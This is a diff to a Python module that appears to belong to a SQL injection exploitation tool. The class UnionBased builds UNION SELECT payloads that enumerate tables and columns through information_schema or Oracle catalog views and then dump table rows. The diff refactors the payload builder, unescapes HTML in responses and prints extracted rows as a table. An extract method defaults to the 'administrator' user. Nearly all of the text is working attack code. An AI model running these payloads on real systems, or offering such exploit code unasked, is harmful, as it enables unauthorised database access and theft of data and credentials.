@@ -1,6 +1,7 @@
 from .main import BaseSQLi
 from .dbConfig import DB_CONFIG
 import re
+import html
 
 
 class UnionBased(BaseSQLi):
@@ -41,16 +42,19 @@ class UnionBased(BaseSQLi):
         print("[-] No string column found.")
         return None
 
-    def _build_union(self, expression):
+    def _build_union(self, expression, from_clause=""):
         nulls = ["NULL"] * self.num_columns
         nulls[self.string_column] = expression
         select = ",".join(nulls)
-        from_dual = DB_CONFIG[self.db_type]['from_dual']
-        return f"' UNION SELECT {select}{from_dual}{DB_CONFIG[self.db_type]['comment']}"
+        if not from_clause:
+            from_clause = DB_CONFIG[self.db_type]['from_dual']
+        return f"' UNION SELECT {select} {from_clause}{DB_CONFIG[self.db_type]['comment']}"
 
     def _extract_marked(self, response_text):
+        text = html.unescape(response_text)
         pattern = re.escape(self.MARKER) + "(.*?)" + re.escape(self.MARKER)
-        return re.findall(pattern, response_text, re.DOTALL)
+        matches = re.findall(pattern, text, re.DOTALL)
+        return [m.strip() for m in matches if not m.startswith("'") and not m.endswith("'")]
 
     def dump_tables(self):
         if self.string_column is None:
@@ -59,10 +63,10 @@ class UnionBased(BaseSQLi):
         concat = DB_CONFIG[self.db_type]["concat"]
         if self.db_type == "oracle":
             col_expr = f"'{self.MARKER}'||table_name||'{self.MARKER}'"
-            payload = self._build_union(f"{col_expr} FROM all_tables")
+            payload = self._build_union(col_expr, "FROM all_tables")
         else:
             col_expr = f"'{self.MARKER}'||table_name||'{self.MARKER}'" if concat in ("||", "+") else f"CONCAT('{self.MARKER}',table_name,'{self.MARKER}')"
-            payload = self._build_union(f"{col_expr} FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='pg_catalog'")
+            payload = self._build_union(col_expr, "FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='pg_catalog'")
         response = self.send(payload)
         tables = self._extract_marked(response.text)
         for t in tables:
@@ -76,10 +80,10 @@ class UnionBased(BaseSQLi):
         concat = DB_CONFIG[self.db_type]["concat"]
         if self.db_type == "oracle":
             col_expr = f"'{self.MARKER}'||column_name||'{self.MARKER}'"
-            payload = self._build_union(f"{col_expr} FROM all_tab_columns WHERE table_name='{table_name.upper()}'")
+            payload = self._build_union(col_expr, f"FROM all_tab_columns WHERE table_name='{table_name.upper()}'")
         else:
             col_expr = f"'{self.MARKER}'||column_name||'{self.MARKER}'" if concat in ("||", "+") else f"CONCAT('{self.MARKER}',column_name,'{self.MARKER}')"
-            payload = self._build_union(f"{col_expr} FROM information_schema.columns WHERE table_name='{table_name}'")
+            payload = self._build_union(col_expr, f"FROM information_schema.columns WHERE table_name='{table_name}'")
         response = self.send(payload)
         columns = self._extract_marked(response.text)
         for c in columns:
@@ -96,12 +100,16 @@ class UnionBased(BaseSQLi):
         else:
             inner = ",".join([f"'~',{c}" for c in columns])[3:]
             col_expr = f"CONCAT('{self.MARKER}',{inner},'{self.MARKER}')"
-        payload = self._build_union(f"{col_expr} FROM {table_name}")
+        payload = self._build_union(col_expr, f"FROM {table_name}")
         response = self.send(payload)
         rows = self._extract_marked(response.text)
+        print(f"\n  {'  |  '.join(columns)}")
+        print(f"  {'-' * (len(columns) * 20)}")
         for row in rows:
             parts = row.split("~")
-            print(f"  [>] {' | '.join(parts)}")
+            truncated = [p.strip()[:50] + ("..." if len(p.strip()) > 50 else "") for p in parts]
+            print(f"  {' | '.join(truncated)}")
+        print(f"\n  [+] {len(rows)} rows found.")
         return rows
 
     def extract(self, column, username='administrator'):
